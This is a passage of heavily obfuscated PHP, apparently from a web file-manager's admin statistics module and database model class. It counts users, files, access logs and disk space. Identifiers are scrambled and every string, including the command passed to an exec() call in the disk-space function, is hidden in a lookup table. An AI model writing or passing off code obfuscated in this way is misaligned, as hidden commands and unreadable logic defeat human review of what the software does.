date($a¶¬ğìÈø®[1601], strtotime($a¶¬ğìÈø®[1602])); $D“Óã‹ğ› = array($a¶¬ğìÈø®[220] => $A·å’†Ç¯Ñ); foreach ($fÒÑïØè‚³[$Fë™òà÷Ô¥] as $B³ª»Ã„Ö => $CË¼Ø““›Î) { $D“Óã‹ğ›[$B³ª»Ã„Ö] = 0; } $E‚¢•‘ÒÖ[] = $D“Óã‹ğ›; } $EâŠÖ“º‡Ğ = array(); foreach ($E‚¢•‘ÒÖ as $CË¼Ø““›Î) { if ($Fë™òà÷Ô¥ == $a¶¬ğìÈø®[1596] && $CË¼Ø““›Î[$a¶¬ğìÈø®[1598]] > $CË¼Ø““›Î[$a¶¬ğìÈø®[713]]) { $CË¼Ø““›Î[$a¶¬ğìÈø®[1598]] = $CË¼Ø““›Î[$a¶¬ğìÈø®[713]]; } foreach ($fÒÑïØè‚³[$Fë™òà÷Ô¥] as $B³ª»Ã„Ö => $Fáè“¢Ìçá) { $f÷…Ææ©ó = array($a¶¬ğìÈø®[220] => $CË¼Ø““›Î[$a¶¬ğìÈø®[220]], $a¶¬ğìÈø®[1410] => $Fáè“¢Ìçá); $f÷…Ææ©ó[$a‚äš î‰Ä[$Fë™òà÷Ô¥]] = isset($CË¼Ø““›Î[$B³ª»Ã„Ö]) ? $CË¼Ø““›Î[$B³ª»Ã„Ö] : 0; $EâŠÖ“º‡Ğ[] = $f÷…Ææ©ó; } } goto a†Á¶¾›Öæ; a†Á¶¾›Öæ: return $EâŠÖ“º‡Ğ; goto aİŞˆÏÉ; eÎ¹ùç»ò¶: $a¶¬ğìÈø® =& $_SERVER[¹Ò‹Ò¹]; if (!$this->init($Fë™òà÷Ô¥)) { return !1; } $E‚¢•‘ÒÖ = $this->trendList($Fë™òà÷Ô¥); goto DÂ™ËáÔÃ; aİŞˆÏÉ: } public function validDate($fÓÊìÓÏº¬, $f…Ã¯ó¸ÒÑ) { goto BóÉƒÂí¿¶; F±­¨©éËÅ: return $C†˜¦‘÷; goto FÂ¡ó¥®áÙ; dêĞë‚À‰: switch ($fÓÊìÓÏº¬) { case $AÛÈÆ‡»µÃ[1485]: $E’ìù³’ğ = mktime(0, 0, 0, date($AÛÈÆ‡»µÃ[1618]), date($AÛÈÆ‡»µÃ[1228]) - date($AÛÈÆ‡»µÃ[1290]) + 7 - 7, date($AÛÈÆ‡»µÃ[1619])); $AïÎ‰³éÉ = 0; do { $fç°²¯÷İ‚ = date($AÛÈÆ‡»µÃ[1601], $E’ìù³’ğ - 3600 * 24 * 7 * $AïÎ‰³éÉ); $C†˜¦‘÷[] = $fç°²¯÷İ‚; $AïÎ‰³éÉ++; } while ($f…Ã¯ó¸ÒÑ < $fç°²¯÷İ‚); break; case $AÛÈÆ‡»µÃ[1483]: $AïÎ‰³éÉ = 1; do { $D†ßàâê´† = date($AÛÈÆ‡»µÃ[1620], strtotime("\x2d\x20{$AïÎ‰³éÉ}\x20\x6d\x6f\156\x74\150\163")); $C†˜¦‘÷[] = $D†ßàâê´†; $AïÎ‰³éÉ++; } while ($f…Ã¯ó¸ÒÑ < $D†ßàâê´†); break; case $AÛÈÆ‡»µÃ[1621]: $b»Ë°°‹Òá = (int) date($AÛÈÆ‡»µÃ[1619], strtotime($f…Ã¯ó¸ÒÑ)); $CÄ‰ºøİ¡‚ = (int) date($AÛÈÆ‡»µÃ[1619]); if ($b»Ë°°‹Òá >= $CÄ‰ºøİ¡‚) { break; } for ($b»Ë°°‹Òá; $b»Ë°°‹Òá < $CÄ‰ºøİ¡‚; $b»Ë°°‹Òá++) { $C†˜¦‘÷[] = $b»Ë°°‹Òá . $AÛÈÆ‡»µÃ[1622]; } break; default: break; } if ($f…Ã¯ó¸ÒÑ > end($C†˜¦‘÷)) { array_pop($C†˜¦‘÷); } sort($C†˜¦‘÷); goto F±­¨©éËÅ; BóÉƒÂí¿¶: $AÛÈÆ‡»µÃ =& $_SERVER[¹Ò‹Ò¹]; $eòÊ…Î¬¹¹ = date($AÛÈÆ‡»µÃ[1601], strtotime($AÛÈÆ‡»µÃ[1602])); $C†˜¦‘÷ = array($eòÊ…Î¬¹¹); goto dêĞë‚À‰; FÂ¡ó¥®áÙ: } public function listTable($a«ĞÉÄ½ç´) { $cØİßÕõºÂ = ucfirst($a«ĞÉÄ½ç´); return Model($cØİßÕõºÂ)->listData(); } public function option($a‡‚áì‰…‰) { $d¹–›íÖå† = $_SERVER[¹Ò‹Ò¹][1623] . ucfirst($a‡‚áì‰…‰); return $this->{$d¹–›íÖå†}(); } private function optionUser() { goto Cƒ†ˆÈêŠ»; FÄÚŞäÕ: if ($cá½ÚÂğÂ¹ < $b¦ÅÇ°öƒ°) { $cá½ÚÂğÂ¹ = $b¦ÅÇ°öƒ°; } $D²ó¾îãÀ = array($f³¹æë¹Àª[1625] => array($f³¹æë¹Àª[947], $cá½ÚÂğÂ¹)); $F£ÄÂ”˜ = (int) Model($f³¹æë¹Àª[501])->where($D²ó¾îãÀ)->count($f³¹æë¹Àª[1504]); goto BªÚÓçÂ‚î; Cƒ†ˆÈêŠ»: $f³¹æë¹Àª =& $_SERVER[¹Ò‹Ò¹]; $cÙÔªô¸£” = Model($f³¹æë¹Àª[501])->count($f³¹æë¹Àª[1504]); $a•‚Á¶ÕÀ = Model($f³¹æë¹Àª[501])->where($f³¹æë¹Àª[1624])->count($f³¹æë¹Àª[1504]); goto D×¼ª¦‡¨; eíÙà‘­¯ã: return array($f³¹æë¹Àª[710] => (int) $cÙÔªô¸£”, $f³¹æë¹Àª[1626] => (int) ($cÙÔªô¸£” - $a•‚Á¶ÕÀ), $f³¹æë¹Àª[1627] => (int) $a•‚Á¶ÕÀ, $f³¹æë¹Àª[1628] => (int) $A”Äğ«Ä, $f³¹æë¹Àª[1629] => $F£ÄÂ”˜); goto Díë’ë¢¢Ç; BªÚÓçÂ‚î: if (!$F£ÄÂ”˜) { $F£ÄÂ”˜ = 1; } $D²ó¾îãÀ = array($f³¹æë¹Àª[1625] => array($f³¹æë¹Àª[947], $b¦ÅÇ°öƒ°)); $A”Äğ«Ä = Model($f³¹æë¹Àª[501])->where($D²ó¾îãÀ)->count($f³¹æë¹Àª[1504]); goto eíÙà‘­¯ã; D×¼ª¦‡¨: $dÕ„êÊÆ¬ = intval($GLOBALS[$f³¹æë¹Àª[6]][$f³¹æë¹Àª[345]][$f³¹æë¹Àª[1464]]) / 3600; $cá½ÚÂğÂ¹ = strtotime("\x2d{$dÕ„êÊÆ¬}\x20\x68\157\165\162\163"); $b¦ÅÇ°öƒ° = strtotime(date($f³¹æë¹Àª[1605])); goto FÄÚŞäÕ; Díë’ë¢¢Ç: } private function optionFile() { goto AÑ¶îÈœ°µ; AÑ¶îÈœ°µ: $bÁ Î½´é =& $_SERVER[¹Ò‹Ò¹]; $Cæ‘âçøÌÚ = $this->sourceSize(); $cÔ¨¨¸¿äé = $Cæ‘âçøÌÚ[$bÁ Î½´é[77]]; goto c… ±õÉÔ˜; c… ±õÉÔ˜: $EÙ…‘Êïö÷ = $Cæ‘âçøÌÚ[$bÁ Î½´é[1598]]; $a³šÓò±»İ = Model($bÁ Î½´é[769])->where(array($bÁ Î½´é[397] => 0))->count($bÁ Î½´é[390]); $b¦ÙËÊ·Äô = array($bÁ Î½´é[397] => 0, $bÁ Î½´é[192] => array($bÁ Î½´é[947], strtotime(date($bÁ Î½´é[1605])))); goto fª˜í¨‡´; fª˜í¨‡´: $eœŒ±±¬ö = Model($bÁ Î½´é[769])->where($b¦ÙËÊ·Äô)->sum($bÁ Î½´é[77]); $C‰”ÕÉ´Îô = Model($bÁ Î½´é[769])->where($b¦ÙËÊ·Äô)->count($bÁ Î½´é[390]); return array($bÁ Î½´é[713] => $cÔ¨¨¸¿äé, $bÁ Î½´é[1598] => $EÙ…‘Êïö÷, $bÁ Î½´é[1630] => $cÔ¨¨¸¿äé - $EÙ…‘Êïö÷, $bÁ Î½´é[1631] => (int) $eœŒ±±¬ö, $bÁ Î½´é[715] => (int) $a³šÓò±»İ, $bÁ Î½´é[1632] => (int) $C‰”ÕÉ´Îô); goto Eïêø•¢—Ã; Eïêø•¢—Ã: } private function optionAccess() { $Bã®×ºÍ˜ =& $_SERVER[¹Ò‹Ò¹]; return array($Bã®×ºÍ˜[710] => $this->typeLogCnt(), $Bã®×ºÍ˜[106] => $this->typeLogCnt($Bã®×ºÍ˜[106]), $Bã®×ºÍ˜[424] => $this->typeLogCnt($Bã®×ºÍ˜[424]), $Bã®×ºÍ˜[1633] => $this->typeLogCnt($Bã®×ºÍ˜[1633]), $Bã®×ºÍ˜[1634] => $this->typeLogCnt($Bã®×ºÍ˜[1634]), $Bã®×ºÍ˜[557] => $this->typeLogCnt($Bã®×ºÍ˜[33], $Bã®×ºÍ˜[1609])); } private function typeLogCnt($CƒØï»½èÀ = '', $Fƒ¥õŸ¦†É = "\x69\x64") { goto AÛõƒ£Û¼¸; Bâ’ø¯Š›: return (int) $e®ñÍîöŞÂ; goto dÑë­°¼æ‹; Cæ‰ÁÃ¡· : $D™‹áí¶Ï¸ = array($FêÍŠÖ´Ğ›[192] => array($FêÍŠÖ´Ğ›[947], $BõË×‚Ü—«)); if ($CƒØï»½èÀ) { $D™‹áí¶Ï¸[$FêÍŠÖ´Ğ›[29]] = array($FêÍŠÖ´Ğ›[7], $EÂê‚’¿[$CƒØï»½èÀ]); } $e®ñÍîöŞÂ = Model($FêÍŠÖ´Ğ›[1608])->where($D™‹áí¶Ï¸)->count($Fƒ¥õŸ¦†É); goto Bâ’ø¯Š›; AÛõƒ£Û¼¸: $FêÍŠÖ´Ğ› =& $_SERVER[¹Ò‹Ò¹]; $EÂê‚’¿ = array($FêÍŠÖ´Ğ›[106] => array($FêÍŠÖ´Ğ›[1635], $FêÍŠÖ´Ğ›[1636]), $FêÍŠÖ´Ğ›[424] => array($FêÍŠÖ´Ğ›[1637], $FêÍŠÖ´Ğ›[1638]), $FêÍŠÖ´Ğ›[1633] => array($FêÍŠÖ´Ğ›[1639], $FêÍŠÖ´Ğ›[1640], $FêÍŠÖ´Ğ›[1641]), $FêÍŠÖ´Ğ›[1634] => array($FêÍŠÖ´Ğ›[1642], $FêÍŠÖ´Ğ›[1643]), $FêÍŠÖ´Ğ›[1644] => array($FêÍŠÖ´Ğ›[1645], $FêÍŠÖ´Ğ›[1646], $FêÍŠÖ´Ğ›[1647])); $BõË×‚Ü—« = strtotime(date($FêÍŠÖ´Ğ›[1605])); goto Cæ‰ÁÃ¡· ; dÑë­°¼æ‹: } private function optionServer() { goto bİ¸è•Ç¦á; F˜ìĞÛÒ‚”: $c…ùÜˆ‚…” = $e­·ÍêÀÊ©[0]; $CÓ¶ğ”‰Ñ± = $GLOBALS[$FÅÀ‰µ ¤‹[6]][$FÅÀ‰µ ¤‹[17]]; $D·‰•”ˆ«¹ = $CÓ¶ğ”‰Ñ±[$FÅÀ‰µ ¤‹[908]]; goto aÆî“–Œ; E±§ÁŠ´²: $AÊ²Ş®ÂÙÚ = array($FÅÀ‰µ ¤‹[762] => $BÅ„õ«±ºê[$FÅÀ‰µ ¤‹[388]]); $e‹é«ÚÃÇ = Model($FÅÀ‰µ ¤‹[444])->where($AÊ²Ş®ÂÙÚ)->sum($FÅÀ‰µ ¤‹[77]); $e­·ÍêÀÊ© = explode($FÅÀ‰µ ¤‹[50], $_SERVER[$FÅÀ‰µ ¤‹[141]]); goto F˜ìĞÛÒ‚”; bİ¸è•Ç¦á: $FÅÀ‰µ ¤‹ =& $_SERVER[¹Ò‹Ò¹]; $B–·éğÄ§‘ = $this->diskDriver(); $BÅ„õ«±ºê = KodIO::defaultDriver(); goto E±§ÁŠ´²; aÆî“–Œ: if ($D·‰•”ˆ«¹ == $FÅÀ‰µ ¤‹[740]) { $F‡Ã‹Ò¥İë = explode($FÅÀ‰µ ¤‹[1140], $CÓ¶ğ”‰Ñ±[$FÅÀ‰µ ¤‹[907]]); $D·‰•”ˆ«¹ = $F‡Ã‹Ò¥İë[0]; } if ($D·‰•”ˆ«¹ == $FÅÀ‰µ ¤‹[743] || $D·‰•”ˆ«¹ == $FÅÀ‰µ ¤‹[744]) { $dØ‚†Î¸‡Í = Model()->db()->query($FÅÀ‰µ ¤‹[1648]); $BÎªª±µ“í = $dØ‚†Î¸‡Í[0] && isset($dØ‚†Î¸‡Í[0][$FÅÀ‰µ ¤‹[1409]]) ? $dØ‚†Î¸‡Í[0][$FÅÀ‰µ ¤‹[1409]] : 0; $D·‰•”ˆ«¹ = $FÅÀ‰µ ¤‹[1649] . ($BÎªª±µ“í ? $FÅÀ‰µ ¤‹[8] . $BÎªª±µ“í : $FÅÀ‰µ ¤‹[33]); } $B¶¡·”ëâÖ = $GLOBALS[$FÅÀ‰µ ¤‹[6]][$FÅÀ‰µ ¤‹[345]][$FÅÀ‰µ ¤‹[771]]; goto F¿ğ¢Ğø“×; F¿ğ¢Ğø“×: return array($FÅÀ‰µ ¤‹[1650] => $B–·éğÄ§‘ ? $B–·éğÄ§‘[$FÅÀ‰µ ¤‹[1651]] : 0, $FÅÀ‰µ ¤‹[1652] => $B–·éğÄ§‘ ? $B–·éğÄ§‘[$FÅÀ‰µ ¤‹[1653]] : 0, $FÅÀ‰µ ¤‹[1654] => (int) $BÅ„õ«±ºê[$FÅÀ‰µ ¤‹[1651]] * 1024 * 1024 * 1024, $FÅÀ‰µ ¤‹[1655] => (int) $e‹é«ÚÃÇ, $FÅÀ‰µ ¤‹[1656] => ucfirst($c…ùÜˆ‚…”), $FÅÀ‰µ ¤‹[1657] => $FÅÀ‰µ ¤‹[1658] . PHP_VERSION, $FÅÀ‰µ ¤‹[1659] => phpBuild64() ? 64 : 32, $FÅÀ‰µ ¤‹[709] => str_replace($FÅÀ‰µ ¤‹[1660], $FÅÀ‰µ ¤‹[924], $D·‰•”ˆ«¹), $FÅÀ‰µ ¤‹[345] => ucfirst($B¶¡·”ëâÖ), $FÅÀ‰µ ¤‹[28] => $_SERVER[$FÅÀ‰µ ¤‹[1661]]); goto BööÃÒÏŠÖ; BööÃÒÏŠÖ: } private function diskDriver() { goto cç˜†Ûôè¤; CäÌñõ±³‘: $E Ò±«ŞÒÎ = $cìÀÚà•¢ - @disk_free_space($eŒÀ‘ÒÔÖ¬); return array($eÓŞ¦åöì‚[1651] => $cìÀÚà•¢, $eÓŞ¦åöì‚[1653] => $E Ò±«ŞÒÎ); goto B˜’“ôĞ™ì; cç˜†Ûôè¤: $eÓŞ¦åöì‚ =& $_SERVER[¹Ò‹Ò¹]; $eŒÀ‘ÒÔÖ¬ = $eÓŞ¦åöì‚[8]; $fùëÒÇË“ = $GLOBALS[$eÓŞ¦åöì‚[6]][$eÓŞ¦åöì‚[1662]] == $eÓŞ¦åöì‚[1663]; goto bÓÚˆØµÑï; bÓÚˆØµÑï: if ($fùëÒÇË“) { $eŒÀ‘ÒÔÖ¬ = $eÓŞ¦åöì‚[1664]; if (function_exists($eÓŞ¦åöì‚[1665])) { exec($eÓŞ¦åöì‚[1666], $eŸÎ·ÁĞ„Ù); $eŒÀ‘ÒÔÖ¬ = $eŸÎ·ÁĞ„Ù[1] . $eÓŞ¦åöì‚[8]; } } if (!file_exists($eŒÀ‘ÒÔÖ¬)) { return; } $cìÀÚà•¢ = @disk_total_space($eŒÀ‘ÒÔÖ¬); goto CäÌñõ±³‘; B˜’“ôĞ™ì: } public function fileChart($cö˜Ÿ¼î» ) { goto a£…˜Š¼Õõ; D£’¾öØğ: $d÷´Û¯Ï„² = $this->sourceSize(); $A·Å±¬ï´‡ = array($AØ¬¬ÓÚ[472] => 0, $AØ¬¬ÓÚ[398] => 1); $b‹º‘º®™ï = Model($AØ¬¬ÓÚ[769])->where($A·Å±¬ï´‡)->sum($AØ¬¬ÓÚ[77]); goto E¡‚°„‰ªŸ; E¡‚°„‰ªŸ: $A·Å±¬ï´‡[$AØ¬¬ÓÚ[398]] = 2; $EÀ°Ù¨ëš´ = Model($AØ¬¬ÓÚ[769])->where($A·Å±¬ï´‡)->sum($AØ¬¬ÓÚ[77]); return array($AØ¬¬ÓÚ[713] => $d÷´Û¯Ï„²[$AØ¬¬ÓÚ[77]], $AØ¬¬ÓÚ[1598] => $d÷´Û¯Ï„²[$AØ¬¬ÓÚ[1598]], $AØ¬¬ÓÚ[1599] => (int) $b‹º‘º®™ï, $AØ¬¬ÓÚ[1600] => (int) $EÀ°Ù¨ëš´); goto eàòÂë’é; a£…˜Š¼Õõ: $AØ¬¬ÓÚ =& $_SERVER[¹Ò‹Ò¹]; if (isset($cö˜Ÿ¼î» [$AØ¬¬ÓÚ[1504]])) { return Model($AØ¬¬ÓÚ[769])->userFileTypeProfile($cö˜Ÿ¼î» [$AØ¬¬ÓÚ[1504]]); } if (isset($cö˜Ÿ¼î» [$AØ¬¬ÓÚ[1667]])) { return Model($AØ¬¬ÓÚ[769])->groupFileTypeProfile($cö˜Ÿ¼î» [$AØ¬¬ÓÚ[1667]]); } goto D£’¾öØğ; eàòÂë’é: } private function sourceSize() { $f¥Å¹Ù‘Ìõ =& $_SERVER[¹Ò‹Ò¹]; $c“öÙá§ = Model($f¥Å¹Ù‘Ìõ[769])->where(array($f¥Å¹Ù‘Ìõ[397] => 0))->sum($f¥Å¹Ù‘Ìõ[77]); $dá£Ìâå¥À = Model($f¥Å¹Ù‘Ìõ[444])->sum($f¥Å¹Ù‘Ìõ[77]); if ($dá£Ìâå¥À > $c“öÙá§) { $dá£Ìâå¥À = $c“öÙá§; } return array($f¥Å¹Ù‘Ìõ[77] => (int) $c“öÙá§, $f¥Å¹Ù‘Ìõ[1598] => (int) $dá£Ìâå¥À); } } goto a©ÔÚÏª„ô; E¡¿ššô¬–: define($_SERVER[¹Ò‹Ò¹][238], 0); define($_SERVER[¹Ò‹Ò¹][239], 2); class Model extends ClassBaseCall { private $_extModel = null; protected $db = null; protected $pk = "\151\x64"; protected $tablePrefix = ''; protected $name = ''; protected $dbName = ''; protected $connection = ''; protected $tableName = ''; protected $trueTableName = ''; protected $error = ''; protected $fields = array(); protected $data = array(); protected $options = array(); protected $_validate = array(); protected $_auto = array(); protected $_map = array(); protected $_scope = array(); protected $autoCheckFields = true; protected $patchValidate = false; protected $methods = array("\x74\x61\142\x6c\x65", "\157\162\144\x65\x72", "\x61\154\x69\141\163", "\x68\x61\x76\x69\156\x67", "\147\x72\x6f\x75\x70", "\x6c\157\x63\x6b", "\x64\x69\x73\x74\x69\156\x63\164", "\141\x75\164\157", "\146\x69\x6c\164\x65\162", "\x76\x61\154\151\144\141\164\145", "\162\x65\163\165\x6c\x74", "\142\x69\156\x64", "\164\x6f\x6b\145\x6e"); public function __construct($bÀµÊÏ¾šè = '', $aŞ–å­÷éµ = '', $bá ‹«ç©™ = '') { $EÛ¥¢Á¬Š™ =& $_SERVER[¹Ò‹Ò¹]; $this->_initialize(); if (!empty($bÀµÊÏ¾šè)) { if (strpos($bÀµÊÏ¾šè, $EÛ¥¢Á¬Š™[94])) { list($this->dbName, $this->name) = explode($EÛ¥¢Á¬Š™[94], $bÀµÊÏ¾šè); } else { $this->name = $bÀµÊÏ¾šè; } } elseif (empty($this->name)) { $this->name = $this->getModelName(); } if (is_null($aŞ–å­÷éµ)) { $this->tablePrefix = $EÛ¥¢Á¬Š™[33]; } elseif ($EÛ¥¢Á¬Š™[33] != $aŞ–å­÷éµ) { $this->tablePrefix = $aŞ–å­÷éµ; } else { $this->tablePrefix = $this->tablePrefix ? $this->tablePrefix : think_config($EÛ¥¢Á¬Š™[240]); } $this->db(0, empty($this->connection) ? $bá ‹«ç©™ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $e¥Ò©é¥ğ¼ =& $_SERVER[¹Ò‹Ò¹]; if (empty($this->fields)) { if (think_config($e¥Ò©é¥ğ¼[241])) { $dß­‚ÂŒÙ† = $this->dbName ? $this->dbName : think_config($e¥Ò©é¥ğ¼[242]); $F¸Œ‰‚Œ†‡ = think_var_cache($e¥Ò©é¥ğ¼[243] . strtolower(get_path_this($dß­‚ÂŒÙ†) . $e¥Ò©é¥ğ¼[94] . $this->name)); if ($F¸Œ‰‚Œ†‡) { $Bç¨íÍ ²Â = think_config($e¥Ò©é¥ğ¼[244]); if (empty($Bç¨íÍ ²Â) || $F¸Œ‰‚Œ†‡[$e¥Ò©é¥ğ¼[245]] == $Bç¨íÍ ²Â) { $this->fields = $F¸Œ‰‚Œ†‡; return; } } } $this->flush(); } } public function flush() { goto CìÍ½¶´‹ó; bÁ˜ä´Ğƒ—: if (think_config($fß¤ñêÉÌ½[241])) { $fçÇË·«éõ = $this->dbName ? $this->dbName : think_config($fß¤ñêÉÌ½[242]); think_var_cache($fß¤ñêÉÌ½[243] . strtolower(get_path_this($fçÇË·«éõ) . $fß¤ñêÉÌ½[94] . $this->name), $this->fields); } goto c•×Ä‘¯; F‚¸ß•ŠŠ¯: foreach ($cåŠ°ÒäÁ as $Dè§á¦éÖˆ => $AòºğĞØë§) { $eŒ¨¡çŒÛ½[$Dè§á¦éÖˆ] = $AòºğĞØë§[$fß¤ñêÉÌ½[29]]; if ($AòºğĞØë§[$fß¤ñêÉÌ½[36]]) { $this->fields[$fß¤ñêÉÌ½[247]] = $Dè§á¦éÖˆ; if ($AòºğĞØë§[$fß¤ñêÉÌ½[39]]) { $this->fields[$fß¤ñêÉÌ½[246]] = !0; } } } $this->fields[$fß¤ñêÉÌ½[248]] = $eŒ¨¡çŒÛ½; if (think_config($fß¤ñêÉÌ½[244])) { $this->fields[$fß¤ñêÉÌ½[245]] = think_config($fß¤ñêÉÌ½[244]); } goto bÁ˜ä´Ğƒ—; CìÍ½¶´‹ó: $fß¤ñêÉÌ½ =& $_SERVER[¹Ò‹Ò¹]; $this->db->setModel($this->name); $cåŠ°ÒäÁ = $this->db->getFields($this->getTableName()); goto cÛÓ×Ì‘—Å; cÛÓ×Ì‘—Å: if (!$cåŠ°ÒäÁ) { return !1; } $this->fields = array_keys($cåŠ°ÒäÁ); $this->fields[$fß¤ñêÉÌ½[246]] = !1; goto F‚¸ß•ŠŠ¯; c•×Ä‘¯: } public function switchModel($F¹µóá÷È, $cÖÀõ½ôÈÓ = array()) { $FÎ«´Æœ˜¤ =& $_SERVER[¹Ò‹Ò¹]; $dÈ‚š•š‘ = ucwords(strtolower($F¹µóá÷È)) . $FÎ«´Æœ˜¤[249]; if (!class_exists($dÈ‚š•š‘)) { think_exception($dÈ‚š•š‘ . think_lang($FÎ«´Æœ˜¤[250])); } $this->_extModel = new $dÈ‚š•š‘($this->name); if (!empty($cÖÀõ½ôÈÓ)) { foreach ($cÖÀõ½ôÈÓ as $b²¡Ñ·‹©ò) { $this->_extModel->setProperty($b²¡Ñ·‹©ò, $this->{$b²¡Ñ·‹©ò}); } } return $this->_extModel; } public function __set($c¥Ùãë—‰ë, $d¡åß»ç³¹) { $this->data[$c¥Ùãë—‰ë] = $d¡åß»ç³¹; } public function __get($cÒÜËÕ³ì„) { return isset($this->data[$cÒÜËÕ³ì„]) ? $this->data[$cÒÜËÕ³ì„] : null; } public function __isset($d¾¶…è’È) { return isset($this->data[$d¾¶…è’È]); } public function __unset($C­Á»·º­) { unset($this->data[$C­Á»·º­]); } public function __call($DëÊ™¯§¿İ, $EöãÁÏÙÔƒ) { $DÔÅæÅÖ¿Ÿ =& $_SERVER[¹Ò‹Ò¹]; if (in_array(strtolower($DëÊ™¯§¿İ), $this->methods, !0)) { $this->options[strtolower($DëÊ™¯§¿İ)] = $EöãÁÏÙÔƒ[0]; return $this; } elseif (in_array(strtolower($DëÊ™¯§¿İ), array($DÔÅæÅÖ¿Ÿ[251], $DÔÅæÅÖ¿Ÿ[252], $DÔÅæÅÖ¿Ÿ[253], $DÔÅæÅÖ¿Ÿ[254], $DÔÅæÅÖ¿Ÿ[255]), !0)) { $Fºª‹²æ¸ = isset($EöãÁÏÙÔƒ[0]) ? $EöãÁÏÙÔƒ[0] : $DÔÅæÅÖ¿Ÿ[181]; $Fºª‹²æ¸ = $this->db->parseKey($Fºª‹²æ¸); return $this->getField(strtoupper($DëÊ™¯§¿İ) . $DÔÅæÅÖ¿Ÿ[256] . $Fºª‹²æ¸ . $DÔÅæÅÖ¿Ÿ[257] . $DëÊ™¯§¿İ, $DÔÅæÅÖ¿Ÿ[251]); } elseif (strtolower(substr($DëÊ™¯§¿İ, 0, 5)) == $DÔÅæÅÖ¿Ÿ[258]) { $Fºª‹²æ¸ = think_parse_name(substr($DëÊ™¯§¿İ, 5)); $bƒ²¼Ñì©¦[$Fºª‹²æ¸] = $EöãÁÏÙÔƒ[0]; return $this->where($bƒ²¼Ñì©¦)->find(); } elseif (strtolower(substr($DëÊ™¯§¿İ, 0, 10)) == $DÔÅæÅÖ¿Ÿ[259]) { $E‘¯ÑÛ Ê = think_parse_name(substr($DëÊ™¯§¿İ, 10)); $bƒ²¼Ñì©¦[$E‘¯ÑÛ Ê] = $EöãÁÏÙÔƒ[0]; return $this->where($bƒ²¼Ñì©¦)->getField($EöãÁÏÙÔƒ[1]); } elseif (isset($this->_scope[$DëÊ™¯§¿İ])) { return $this->scope($DëÊ™¯§¿İ, $EöãÁÏÙÔƒ[0]); } elseif (method_exists($this, $DëÊ™¯§¿İ)) { array_unshift($EöãÁÏÙÔƒ, $DëÊ™¯§¿İ); return call_user_func_array(array($this, $DÔÅæÅÖ¿Ÿ[260]), $EöãÁÏÙÔƒ); } else { return call_user_func_array(array(parent, $DëÊ™¯§¿İ), $EöãÁÏÙÔƒ); } } protected function call() { goto F¥‘º…°ïÉ; Fß‘‡’ï¾: if (isset($EÔß˜…ø·†[$B±ìÏ©Üµˆ]) && $EÔß˜…ø·†[$B±ìÏ©Üµˆ] === $aÆïñ¿ÈÆ) { think_exception(__CLASS__ . $e‰ãƒÂºÎç[4] . $aÆïñ¿ÈÆ . think_lang($e‰ãƒÂºÎç[261])); return; } $EÔß˜…ø·†[] = $aÆïñ¿ÈÆ; if (method_exists($this, $e‰ãƒÂºÎç[262])) { $cÙ½†íø†Ô = call_user_func_array(array($this, $e‰ãƒÂºÎç[263]), array($eáÎÙ„Âá, $EÔß˜…ø·†)); if (!is_null($cÙ½†íø†Ô) && $cÙ½†íø†Ô !== !1) { return $cÙ½†íø†Ô; } } goto d·øåÙÄŠØ; F¥‘º…°ïÉ: $e‰ãƒÂºÎç =& $_SERVER[¹Ò‹Ò¹]; $EÔß˜…ø·† = func_get_args(); $aÆïñ¿ÈÆ = array_shift($EÔß˜…ø·†); goto Dä¼¿˜›ë‰; d·øåÙÄŠØ: $c…‘÷ŠêŸ = call_user_func_array(array($this, $aÆïñ¿ÈÆ), $EÔß˜…ø·†); if (method_exists($this, $e‰ãƒÂºÎç[264])) { $cÙ½†íø†Ô = call_user_func_array(array($this, $e‰ãƒÂºÎç[265]), array($eáÎÙ„Âá, $EÔß˜…ø·†, $c…‘÷ŠêŸ)); if ($cÙ½†íø†Ô) { return $cÙ½†íø†Ô; } } return $c…‘÷ŠêŸ; goto d¤´÷Ÿ‚ò; Dä¼¿˜›ë‰: $eáÎÙ„Âá = $aÆïñ¿ÈÆ; if (is_array($aÆïñ¿ÈÆ)) { $eáÎÙ„Âá = $aÆïñ¿ÈÆ[1]; $aÆïñ¿ÈÆ = $aÆïñ¿ÈÆ[0]; } $B±ìÏ©Üµˆ = count($EÔß˜…ø·†) - 1; goto Fß‘‡’ï¾; d¤´÷Ÿ‚ò: } protected function _initialize() { } protected function _facade($bŠ«ÅÄ´ôë) { $Bó¿®ï¿ä£ =& $_SERVER[¹Ò‹Ò¹]; if (!empty($this->fields)) { foreach ($bŠ«ÅÄ´ôë as $C­Ô‘Ô÷İÂ => $f¿ùËÙö¿¸) { if (is_array($this->fields) && !in_array($C­Ô‘Ô÷İÂ, $this->fields, !0)) { unset($bŠ«ÅÄ´ôë[$C­Ô‘Ô÷İÂ]); } elseif (is_scalar($f¿ùËÙö¿¸)) { $this->_parseType($bŠ«ÅÄ´ôë, $C­Ô‘Ô÷İÂ); } } } if (!empty($this->options[$Bó¿®ï¿ä£[266]])) { $bŠ«ÅÄ´ôë = array_map($this->options[$Bó¿®ï¿ä£[266]], $bŠ«ÅÄ´ôë); unset($this->options[$Bó¿®ï¿ä£[266]]); } $this->_beforeWrite($bŠ«ÅÄ´ôë); return $bŠ«ÅÄ´ôë; } protected function _beforeWrite(&$DÔôê…ïè) { } public function add($eœ°ÙÈ½“ç = '', $B–¢²Ñø»¸ = array(), $Añ¢»º¤Œ† = false) { goto d˜ïİ‘©; eŞ»İŠÍ: return $bÑÃÒËãëÅ; goto CÏÂÕ Ã³ä; bÆÅ›Îè›: if (!1 === $this->_beforeInsert($eœ°ÙÈ½“ç, $B–¢²Ñø»¸)) { return !1; } $bÑÃÒËãëÅ = $this->db->insert($eœ°ÙÈ½“ç, $B–¢²Ñø»¸, $Añ¢»º¤Œ†); if (!1 !== $bÑÃÒËãëÅ) { $BÇÃ¬òˆÂÏ = $this->getLastInsID(); if ($BÇÃ¬òˆÂÏ) { $eœ°ÙÈ½“ç[$this->getPk()] = $BÇÃ¬òˆÂÏ; $this->_after_insert($eœ°ÙÈ½“ç, $B–¢²Ñø»¸); return $BÇÃ¬òˆÂÏ; } $this->_after_insert($eœ°ÙÈ½“ç, $B–¢²Ñø»¸); } goto eŞ»İŠÍ; d˜ïİ‘©: if (empty($eœ°ÙÈ½“ç)) { if (!empty($this->data)) { $eœ°ÙÈ½“ç = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[¹Ò‹Ò¹][267]); return !1; } } $B–¢²Ñø»¸ = $this->_parseOptions($B–¢²Ñø»¸); $eœ°ÙÈ½“ç = $this->_facade($eœ°ÙÈ½“ç); goto bÆÅ›Îè›; 